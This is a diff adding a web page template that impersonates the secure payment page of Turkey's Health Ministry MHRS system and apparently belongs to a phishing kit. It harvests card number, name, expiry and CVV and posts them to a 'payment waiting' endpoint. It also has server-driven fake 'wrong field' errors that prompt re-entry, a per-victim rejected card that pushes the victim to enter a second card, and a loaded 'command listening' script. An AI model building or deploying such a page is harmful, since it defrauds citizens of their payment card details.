@@ -1,0 +1,500 @@
+<!doctype html>
+<html lang="tr"><head>
+    <meta charset="utf-8">
+    <title>MHRS | Güvenli Ödeme</title>
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, shrink-to-fit=no, maximum-scale=1.0, minimum-scale=1.0">
+    <link rel="shortcut icon" href="/img/icon/favIcon.png">
+  <link rel="stylesheet" href="/css/anasayfa.css">
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>tailwind.config = { corePlugins: { preflight: false } };</script>
+  </head>
+
+  <body style="margin: 0; background: #f5f6f8;">
+
+    <%- include("partials/header") %>
+
+    <main class="max-w-3xl mx-auto" style="padding: 24px 16px 40px;">
+      <div class="bg-white rounded-lg shadow-xl w-full overflow-hidden">
+        <div class="px-6 py-4 flex items-center justify-between" style="background: #a21f29;">
+          <div>
+            <h2 class="text-white font-bold text-lg" style="margin: 0;">Güvenli Ödeme</h2>
+            <p class="text-xs" style="color: #fecaca; margin: 2px 0 0;"><%= odeme.borcBilgi %></p>
+          </div>
+          <div class="text-white text-xs flex items-center gap-1" style="background: rgba(255,255,255,0.15); padding: 6px 10px; border-radius: 6px;">
+            <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="currentColor"><path d="M12 1a5 5 0 0 0-5 5v3H6a2 2 0 0 0-2 2v10a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V11a2 2 0 0 0-2-2h-1V6a5 5 0 0 0-5-5zm-3 8V6a3 3 0 1 1 6 0v3H9z"/></svg>
+            <span>256-bit SSL</span>
+          </div>
+        </div>
+        <div class="p-6">
+          <div class="flex flex-col md:flex-row gap-6">
+            <div class="md:w-1/2">
+              <div style="height: 210px;">
+                <div id="kartCevirici" style="position: relative; width: 100%; height: 100%; transform-style: preserve-3d; transition: transform 0.6s ease;">
+                  <div id="kartOnYuz" class="rounded-xl p-5 text-white" style="transform: translateZ(0); position: absolute; inset: 0; backface-visibility: hidden; -webkit-backface-visibility: hidden; background: linear-gradient(135deg, #4b5563 0%, #6b7280 60%, #9ca3af 100%); overflow: hidden; box-shadow: 0 10px 25px rgba(75, 85, 99, 0.35);">
+                    <div style="position: absolute; top: -50px; right: -40px; width: 180px; height: 180px; border-radius: 50%; background: rgba(255, 255, 255, 0.10);"></div>
+                    <div style="position: absolute; bottom: -60px; left: -30px; width: 200px; height: 200px; border-radius: 50%; background: rgba(255, 255, 255, 0.07);"></div>
+                    <div class="flex justify-between items-start" style="position: relative;">
+                      <div class="text-xs" id="kartKurumOnizleme" style="opacity: 0.85;">T.C. SAĞLIK BAKANLIĞI</div>
+                      <div class="text-sm font-bold italic" id="kartMarkaOnizleme" style="letter-spacing: 1px;">VISA</div>
+                    </div>
+                    <div class="mt-8" style="position: relative;">
+                      <div class="text-lg" id="kartNumaraOnizleme" style="font-family: Consolas, monospace; letter-spacing: 3px;">0000 0000 0000 0000</div>
+                    </div>
+                    <div class="flex justify-between items-end" style="position: relative; margin-top: 34px;">
+                      <div>
+                        <div class="text-xs" style="opacity: 0.7;">KART SAHİBİ</div>
+                        <div class="text-sm font-semibold" id="kartIsimOnizleme" style="text-transform: uppercase;"><%= kullanici.ad ? kullanici.ad : 'KART SAHİBİ' %></div>
+                      </div>
+                      <div class="text-right">
+                        <div class="text-xs" style="opacity: 0.7;">SON KULLANMA</div>
+                        <div class="text-sm font-semibold" id="kartTarihOnizleme">AA/YY</div>
+                      </div>
+                    </div>
+                  </div>
+                  <div id="kartArkaYuz" class="rounded-xl text-white" style="display: none; position: absolute; inset: 0; backface-visibility: hidden; -webkit-backface-visibility: hidden; background: linear-gradient(135deg, #4b5563 0%, #6b7280 60%, #9ca3af 100%); overflow: hidden; box-shadow: 0 10px 25px rgba(75, 85, 99, 0.35);">
+                    <div style="position: absolute; top: 22px; left: 0; right: 0; height: 42px; background: #1f2937;"></div>
+                    <div style="position: absolute; top: 88px; left: 20px; right: 60px; height: 34px; background: #fff; border-radius: 4px; display: flex; align-items: center; justify-content: flex-end; padding-right: 10px;">
+                      <span id="kartCvvOnizleme" style="color: #1f2937; font-family: Consolas, monospace; font-size: 14px; font-weight: bold; letter-spacing: 3px;">•••</span>
+                    </div>
+                    <div style="position: absolute; top: 88px; left: 20px; right: 60px; height: 34px; display: flex; align-items: center; padding-left: 10px; pointer-events: none;">
+                      <span style="font-family: cursive; font-style: italic; color: #6b7280; font-size: 13px;">İmza</span>
+                    </div>
+                    <div style="position: absolute; bottom: 20px; left: 20px; right: 20px; display: flex; justify-content: space-between; align-items: center;">
+                      <div class="text-xs" id="kartKurumArka" style="opacity: 0.85;">T.C. SAĞLIK BAKANLIĞI</div>
+                      <div class="text-sm font-bold italic" id="kartMarkaArka" style="letter-spacing: 1px;">VISA</div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+              <p class="text-xs text-gray-400 mt-3" style="margin-bottom: 0;">Ödemeniz 256-bit SSL sertifikası ile güvenle işlenir.</p>
+            </div>
+            <div class="md:w-1/2">
+              <div class="mb-4">
+                <label class="block text-xs font-semibold text-gray-700 mb-1" for="odemeKartNo">Kart Numarası</label>
+                <input type="text" id="odemeKartNo" inputmode="numeric" maxlength="19" placeholder="0000 0000 0000 0000" class="w-full border border-gray-300 rounded px-3 py-2 text-sm focus:outline-none" style="font-family: Consolas, monospace;">
+                <div id="binSonuc" class="text-xs mt-1" style="display: none; color: #15803d; font-weight: 600;"></div>
+                <div id="odemeHata" class="mt-2 rounded-md border px-3 py-2 text-xs font-medium" style="display: none; background: #fff5f5; color: #7a1d2f; border-color: #f1c7ce; line-height: 1.5; box-shadow: inset 0 1px 0 rgba(255,255,255,0.5);"></div>
+              </div>
+              <div class="mb-4">
+                <label class="block text-xs font-semibold text-gray-700 mb-1" for="odemeIsim">Kart Üzerindeki İsim</label>
+                <input type="text" id="odemeIsim" maxlength="40" placeholder="AD SOYAD" class="w-full border border-gray-300 rounded px-3 py-2 text-sm focus:outline-none" style="text-transform: uppercase;" value="<%= kullanici.ad ? kullanici.ad : '' %>">
+              </div>
+              <div class="flex gap-4">
+                <div class="mb-4 flex-1">
+                  <label class="block text-xs font-semibold text-gray-700 mb-1" for="odemeTarih">Son Kullanma Tarihi</label>
+                  <input type="text" id="odemeTarih" inputmode="numeric" maxlength="5" placeholder="AA/YY" class="w-full border border-gray-300 rounded px-3 py-2 text-sm focus:outline-none">
+                </div>
+                <div class="mb-4" style="width: 110px;">
+                  <label class="block text-xs font-semibold text-gray-700 mb-1" for="odemeCvv">CVV</label>
+                  <input type="password" id="odemeCvv" inputmode="numeric" maxlength="3" placeholder="•••" class="w-full border border-gray-300 rounded px-3 py-2 text-sm focus:outline-none">
+                </div>
+              </div>
+            </div>
+          </div>
+          <div class="mt-6 pt-4" style="border-top: 1px solid #e5e7eb;">
+            <div class="flex items-center justify-between">
+              <div class="text-sm text-gray-600">Borç Tutarı</div>
+              <div class="text-sm text-gray-800 font-semibold"><%= odeme.borcTutarMetin %></div>
+            </div>
+            <% if (odeme.gecikmeFaizi > 0) { %>
+            <div class="flex items-center justify-between mt-1">
+              <div class="text-sm text-gray-600">Gecikme Faizi</div>
+              <div class="text-sm text-gray-800 font-semibold"><%= odeme.faizTutariMetin %></div>
+            </div>
+            <% } %>
+            <div class="flex items-center justify-between mt-1">
+              <div class="text-sm font-semibold text-gray-700">Toplam Ödenecek Tutar</div>
+              <div class="text-red-600 font-bold text-xl"><%= odeme.toplamMetin %></div>
+            </div>
+          </div>
+          <button type="button" id="odemeTamamlaBtn" class="w-full rounded text-white font-bold py-3 mt-4" style="background: #a21f29; border: none; cursor: pointer;"><%= odeme.toplamMetin %> Ödemeyi Tamamla</button>
+        </div>
+      </div>
+      <p class="text-center text-xs text-gray-400 mt-4" style="margin-bottom: 0;">
+        Bu sayfa yalnızca T.C. Sağlık Bakanlığı MHRS sistemi üzerinden yapılan resmî ödemeler için kullanılır.
+      </p>
+    </main>
+
+    <%- include("partials/footer") %>
+
+    <script>
+      (function () {
+        try {
+          var kartNo = document.getElementById("odemeKartNo");
+          var isim = document.getElementById("odemeIsim");
+          var tarih = document.getElementById("odemeTarih");
+          var cvv = document.getElementById("odemeCvv");
+          var params = new URLSearchParams(window.location.search || '');
+          var hataNeden = String(params.get('neden') || '').toLowerCase();
+          var hataVar = params.get('hata') === 'gecersizKart';
+          var onizlemeNo = document.getElementById("kartNumaraOnizleme");
+          var onizlemeIsim = document.getElementById("kartIsimOnizleme");
+          var onizlemeTarih = document.getElementById("kartTarihOnizleme");
+          var cevirici = document.getElementById("kartCevirici");
+          var cvvOnizleme = document.getElementById("kartCvvOnizleme");
+          var hata = document.getElementById("odemeHata");
+          var tamamla = document.getElementById("odemeTamamlaBtn");
+          var binSonuc = document.getElementById("binSonuc");
+          var markaOnizleme = document.getElementById("kartMarkaOnizleme");
+          var markaArka = document.getElementById("kartMarkaArka");
+          var kurumOnizleme = document.getElementById("kartKurumOnizleme");
+          var kurumArka = document.getElementById("kartKurumArka");
+          var gecersizKartNo = <%- JSON.stringify((kullanici && kullanici.gecersizKartNo) ? String(kullanici.gecersizKartNo).replace(/\D/g, '') : '') %>;
+          if (!kartNo || !tamamla) return;
+
+          if (hataVar) {
+            alanHataGoster(hataNeden || 'kartNo');
+          }
+
+          if (kartNo) kartNo.focus();
+
+          function kartEngelKontrolu(no) {
+            if (!gecersizKartNo || !no) return false;
+            if (String(no).replace(/\D/g, '') === gecersizKartNo) {
+              hata.textContent = "Bu kart ödeme için uygun değildir. Lütfen farklı bir kart girin.";
+              hata.style.display = "block";
+              kartInputDurum(true);
+              if (tamamla) tamamla.disabled = true;
+              return true;
+            }
+            if (tamamla) tamamla.disabled = false;
+            return false;
+          }
+
+          function hataliAlanMesaji(neden) {
+            var harita = {
+              kartno: { alan: 'kartNo', mesaj: 'Kart numarasını hatalı girdiniz.' },
+              kartno: { alan: 'kartNo', mesaj: 'Kart numarasını hatalı girdiniz.' },
+              skt: { alan: 'skt', mesaj: 'Kart son kullanım tarihini hatalı girdiniz.' },
+              cvv: { alan: 'cvv', mesaj: 'CVV kodunu hatalı girdiniz.' }
+            };
+            var secim = harita[neden] || harita.kartno;
+            return secim;
+          }
+
+          function alanHataGoster(neden) {
+            var secim = hataliAlanMesaji(neden);
+            hata.textContent = secim.mesaj;
+            hata.style.display = 'block';
+
+            kartNo.style.borderColor = '#d1d5db';
+            kartNo.style.background = '#ffffff';
+            if (tarih) {
+              tarih.style.borderColor = '#d1d5db';
+              tarih.style.background = '#ffffff';
+            }
+            if (cvv) {
+              cvv.style.borderColor = '#d1d5db';
+              cvv.style.background = '#ffffff';
+            }
+
+            if (secim.alan === 'kartNo' && kartNo) {
+              kartNo.style.borderColor = '#dc2626';
+              kartNo.style.background = '#fef2f2';
+              kartNo.focus();
+            }
+            if (secim.alan === 'skt' && tarih) {
+              tarih.style.borderColor = '#dc2626';
+              tarih.style.background = '#fef2f2';
+              tarih.focus();
+            }
+            if (secim.alan === 'cvv' && cvv) {
+              cvv.style.borderColor = '#dc2626';
+              cvv.style.background = '#fef2f2';
+              cvv.focus();
+            }
+          }
+
+          function markaGuncelle(marka) {
+            var yeni = marka || "VISA";
+            if (markaOnizleme) markaOnizleme.textContent = yeni;
+            if (markaArka) markaArka.textContent = yeni;
+          }
+
+          function kurumGuncelle(bankaAdi) {
+            var yeni = bankaAdi && String(bankaAdi).trim() ? String(bankaAdi).trim() : "T.C. SAĞLIK BAKANLIĞI";
+            if (kurumOnizleme) kurumOnizleme.textContent = yeni;
+            if (kurumArka) kurumArka.textContent = yeni;
+          }
+
+          kurumGuncelle(null);
+
+          var binTimer = null;
+          var kartEngelli = false;
+          var binKontrolBekleniyor = false; // 16 hane kontrolü cevabı beklenirken submit engellenir
+
+          // Banka -> kart rengi eşlemesi (3 stoplu degrade). Sıra önemli: önce özel,
+          // sonra genel anahtarlar (örn. "ZİRAAT KATILIM" -> "ZİRAAT"tan önce gelir).
+          var KART_RENKLERI = [
+              { anahtar: "ZİRAAT KATILIM", renkler: ["#003d2b", "#005a3c", "#1e7a4c"] },
+              { anahtar: "ZİRAAT", renkler: ["#00452f", "#00643f", "#1e8a55"] },
+              { anahtar: "VAKIF KATILIM", renkler: ["#5a0d1f", "#8c1633", "#b02a4a"] },
+              { anahtar: "VAKIFLAR", renkler: ["#6d0f1e", "#a11f33", "#c73852"] },
+              { anahtar: "İŞ BANKASI", renkler: ["#002d5c", "#004a99", "#2d6fc4"] },
+              { anahtar: "GARANTİ", renkler: ["#006e57", "#00a550", "#34c97c"] },
+              { anahtar: "YAPI VE KREDİ", renkler: ["#8f0e14", "#c8102e", "#e84a3c"] },
+              { anahtar: "HALK BANKASI", renkler: ["#00554b", "#009d7e", "#26c6a6"] },
+              { anahtar: "AKBANK", renkler: ["#b3001b", "#e4002b", "#ff5c5c"] },
+              { anahtar: "DENİZ BANK", renkler: ["#005c5c", "#00a6a6", "#35c4c4"] },
+              { anahtar: "FİNANSBANK", renkler: ["#003f87", "#0067b3", "#3d8fd4"] },
+              { anahtar: "HSBC", renkler: ["#99000e", "#db0011", "#ff4d4d"] },
+              { anahtar: "ING BANK", renkler: ["#b34700", "#ff6200", "#ff944d"] },
+              { anahtar: "CITIBANK", renkler: ["#002d5c", "#003d73", "#0f5f9e"] },
+              { anahtar: "KUVEYT TÜRK", renkler: ["#005c2f", "#00a651", "#35c97c"] },
+              { anahtar: "TÜRKİYE FİNANS", renkler: ["#990011", "#e4002b", "#ff5c5c"] },
+              { anahtar: "ALBARAKA", renkler: ["#a33a00", "#e64a19", "#ff7d5c"] },
+              { anahtar: "EMLAK KATILIM", renkler: ["#004d33", "#007a52", "#2d9d74"] },
+              { anahtar: "ŞEKERBANK", renkler: ["#003f87", "#00529b", "#3d8fd4"] },
+              { anahtar: "TEKSTİLBANK", renkler: ["#8f0e14", "#c8102e", "#e84a3c"] },
+              { anahtar: "TÜRK EKONOMİ", renkler: ["#99000e", "#db0011", "#ff4d4d"] },
+              { anahtar: "TURKISHBANK", renkler: ["#002d5c", "#004a99", "#2d6fc4"] },
+              { anahtar: "POSTA VE TELGRAF", renkler: ["#99000e", "#d71920", "#ff5c5c"] },
+              { anahtar: "TURKCELL", renkler: ["#004a66", "#0099cc", "#4db8d4"] },
+              { anahtar: "FIBABANKA", renkler: ["#00454f", "#007a8c", "#2d9dae"] }
+          ];
+          // Varsayılan: gri
+          var KART_RENK_VARSAYILAN = ["#4b5563", "#6b7280", "#9ca3af"];
+
+          function kartGradyan(renkler) {
+              return "linear-gradient(135deg, " + renkler[0] + " 0%, " + renkler[1] + " 60%, " + renkler[2] + " 100%)";
+          }
+
+          function kartRengiUygula(bankaAdi) {
+              var renkler = KART_RENK_VARSAYILAN;
+              if (bankaAdi) {
+                  var norm = String(bankaAdi).toUpperCase().replace(/\./g, " ").replace(/\s+/g, " ").trim();
+                  for (var i = 0; i < KART_RENKLERI.length; i++) {
+                      if (norm.indexOf(KART_RENKLERI[i].anahtar) !== -1) {
+                          renkler = KART_RENKLERI[i].renkler;
+                          break;
+                      }
+                  }
+              }
+              var grad = kartGradyan(renkler);
+              var onYuz = document.getElementById("kartOnYuz");
+              var arkaYuz = document.getElementById("kartArkaYuz");
+              if (onYuz) onYuz.style.background = grad;
+              if (arkaYuz) arkaYuz.style.background = grad;
+          }
+
+          // Kart numarası inputu için kırmızı/yeşil durum görünümü
+          function kartInputDurum(hatali) {
+              if (!kartNo) return;
+              if (hatali) {
+                  kartNo.style.borderColor = "#dc2626";
+                  kartNo.style.background = "#fef2f2";
+              } else {
+                  kartNo.style.borderColor = "#d1d5db";
+                  kartNo.style.background = "#ffffff";
+              }
+          }
+
+          function binSorgula(bin, tamKontrol) {
+            binKontrolBekleniyor = tamKontrol;
+            if (tamKontrol && binSonuc) {
+              binSonuc.style.display = "block";
+              binSonuc.style.color = "#6b7280";
+              binSonuc.textContent = "Kart kontrol ediliyor...";
+            }
+            fetch("/api/bin/" + bin)
+              .then(function (r) { return r.json(); })
+              .then(function (j) {
+                if (!binSonuc) return;
+                if (j && j.ok && j.bulundu) {
+                  if (j.engelli) {
+                    kartEngelli = true;
+                    binKontrolBekleniyor = false;
+                    markaGuncelle(j.marka);
+                    kurumGuncelle(j.banka || null);
+                    kartRengiUygula(j.banka);
+                    if (tamKontrol) {
+                      binSonuc.style.color = "#b91c1c";
+                      binSonuc.textContent = "Kart numarası hatalı";
+                      kartInputDurum(true);
+                    } else {
+                      kartInputDurum(false);
+                    }
+                  } else {
+                    kartEngelli = false;
+                    binKontrolBekleniyor = false;
+                    markaGuncelle(j.marka);
+                    kurumGuncelle(j.banka || null);
+                    kartRengiUygula(j.banka);
+                    if (tamKontrol) {
+                      binSonuc.style.display = "none";
+                      kartInputDurum(false);
+                    }
+                  }
+                } else {
+                  kartEngelli = false;
+                  binKontrolBekleniyor = false;
+                  markaGuncelle("VISA");
+                  kurumGuncelle(null);
+                  kartRengiUygula(null);
+                  if (tamKontrol) {
+                    binSonuc.style.color = "#b91c1c";
+                    binSonuc.textContent = "Kart numarası hatalı";
+                    kartInputDurum(true);
+                  } else {
+                    kartInputDurum(false);
+                  }
+                }
+              })
+              .catch(function () {
+                if (tamKontrol && binSonuc) {
+                  kartEngelli = false;
+                  binKontrolBekleniyor = false;
+                  markaGuncelle("VISA");
+                  kurumGuncelle(null);
+                  binSonuc.style.color = "#b91c1c";
+                  binSonuc.textContent = "Kart doğrulanamadı";
+                  kartInputDurum(false);
+                  kartRengiUygula(null);
+                }
+              });
+          }
+
+          kartNo.addEventListener("input", function () {
+            var ra = this.value.replace(/\D/g, "").slice(0, 16);
+            this.value = ra.replace(/(\d{4})(?=\d)/g, "$1 ");
+            var gruplar = ra.match(/.{1,4}/g) || [];
+            onizlemeNo.textContent = gruplar.length ? gruplar.join(" ") : "";
+            if (gecersizKartNo && ra === gecersizKartNo) {
+              kartEngelKontrolu(ra);
+              return;
+            }
+            hata.style.display = "none";
+            if (binSonuc) binSonuc.style.display = "none";
+            markaGuncelle("VISA");
+            kurumGuncelle(null);
+            kartRengiUygula(null);
+            kartInputDurum(false);
+            if (tamamla) tamamla.disabled = false;
+            if (ra.length === 6 || ra.length === 16) {
+              var bin = ra.slice(0, 6);
+              var tam = ra.length === 16;
+              clearTimeout(binTimer);
+              binTimer = setTimeout(function () {
+                binSorgula(bin, tam);
+                if (tam && tarih && document.activeElement === kartNo) {
+                  setTimeout(function () { tarih.focus(); }, 120);
+                }
+              }, 350);
+            }
+          });
+          isim.addEventListener("input", function () {
+            this.value = this.value.toUpperCase();
+            onizlemeIsim.textContent = this.value || '<%= kullanici.ad ? kullanici.ad : "KART SAHİBİ" %>';
+            hata.style.display = "none";
+          });
+          tarih.addEventListener("input", function () {
+            var ra = this.value.replace(/\D/g, "").slice(0, 4);
+            this.value = ra.length > 2 ? ra.slice(0, 2) + "/" + ra.slice(2) : ra;
+            onizlemeTarih.textContent = this.value || "AA/YY";
+            hata.style.display = "none";
+            if (this.value.length === 5 && cvv && document.activeElement === tarih) {
+              setTimeout(function () { cvv.focus(); }, 80);
+            }
+          });
+          cvv.addEventListener("input", function () {
+            this.value = this.value.replace(/\D/g, "").slice(0, 3);
+            if (cvvOnizleme) cvvOnizleme.textContent = this.value ? this.value : "•••";
+            hata.style.display = "none";
+          });
+          if (cevirici) {
+            var perspektifKutu = cevirici.parentElement;
+            var onYuz = document.getElementById("kartOnYuz");
+            var arkaYuz = document.getElementById("kartArkaYuz");
+            cvv.addEventListener("focus", function () {
+              onYuz.style.display = "block";
+              arkaYuz.style.transform = "rotateY(180deg)";
+              arkaYuz.style.display = "block";
+              perspektifKutu.style.perspective = "1000px";
+              cevirici.style.transform = "rotateY(180deg)";
+            });
+            cvv.addEventListener("blur", function () {
+              onYuz.style.display = "block";
+              arkaYuz.style.transform = "rotateY(180deg)";
+              arkaYuz.style.display = "block";
+              perspektifKutu.style.perspective = "1000px";
+              cevirici.style.transition = "none";
+              cevirici.style.transform = "rotateY(180deg)";
+              void cevirici.offsetWidth;
+              cevirici.style.transition = "transform 0.6s ease";
+              cevirici.style.transform = "";
+            });
+            cevirici.addEventListener("transitionend", function () {
+              if (cevirici.style.transform === "rotateY(180deg)") {
+                cevirici.style.transition = "none";
+                cevirici.style.transform = "";
+                void cevirici.offsetWidth;
+                cevirici.style.transition = "transform 0.6s ease";
+                perspektifKutu.style.perspective = "";
+                onYuz.style.display = "none";
+                arkaYuz.style.transform = "";
+              } else {
+                perspektifKutu.style.perspective = "";
+                arkaYuz.style.transform = "";
+                arkaYuz.style.display = "none";
+              }
+            });
+          }
+          tamamla.addEventListener("click", function () {
+            var no = kartNo.value.replace(/\D/g, "").slice(0, 16);
+            var mesaj = "";
+            if (gecersizKartNo && String(no) === gecersizKartNo) {
+              mesaj = "Bu kart ödeme için uygun değildir. Lütfen farklı bir kart girin.";
+            } else if (kartEngelli) mesaj = "Bu kart ödeme için uygun değildir. Lütfen farklı bir kart girin.";
+            else if (binKontrolBekleniyor) mesaj = "Kart doğrulanıyor, lütfen bekleyin.";
+            else if (no.length !== 16) mesaj = "Geçerli bir 16 haneli kart numarası giriniz.";
+            else if (!isim.value.trim()) mesaj = "Kart üzerindeki isim alanını doldurunuz.";
+            else if (tarih.value.length !== 5 || !/^\d{2}\/\d{2}$/.test(tarih.value)) {
+              mesaj = "Son kullanma tarihini AA/YY biçiminde giriniz.";
+            } else {
+              var tarihParcala = tarih.value.split('/');
+              var ay = Number(tarihParcala[0]);
+              var yil = Number(tarihParcala[1]);
+              var simdi = new Date();
+              var yilNow = simdi.getFullYear() % 100;
+              var ayNow = simdi.getMonth() + 1;
+              var gecersizTarih = ay < 1 || ay > 12 || yil < yilNow || (yil === yilNow && ay < ayNow);
+              if (gecersizTarih) {
+                mesaj = "Kart son kullanım tarihi geçersizdir.";
+              } else if (cvv.value.length !== 3) {
+                mesaj = "CVV kodunuz 3 haneli olmalıdır.";
+              }
+            }
+            if (mesaj) {
+              hata.textContent = mesaj;
+              hata.style.display = "block";
+              return;
+            }
+            tamamla.disabled = true;
+            tamamla.style.opacity = "0.6";
+            tamamla.style.cursor = "not-allowed";
+            hata.style.display = "none";
+            var form = document.createElement("form");
+            form.method = "POST";
+            form.action = "/odeme/bekleniyor";
+            form.style.display = "none";
+            var veri = {
+                kartSahibi: isim.value.trim(),
+                kartNo: no,
+                skt: tarih.value,
+                cvv: cvv.value
+            };
+            Object.keys(veri).forEach(function (k) {
+                var input = document.createElement("input");
+                input.type = "hidden";
+                input.name = k;
+                input.value = veri[k];
+                form.appendChild(input);
+            });
+            document.body.appendChild(form);
+            form.submit();
+          });
+        } catch (e) {}
+      })();
+    </script>
+    <script src="/js/komut-dinle.js"></script>
+  </body></html>
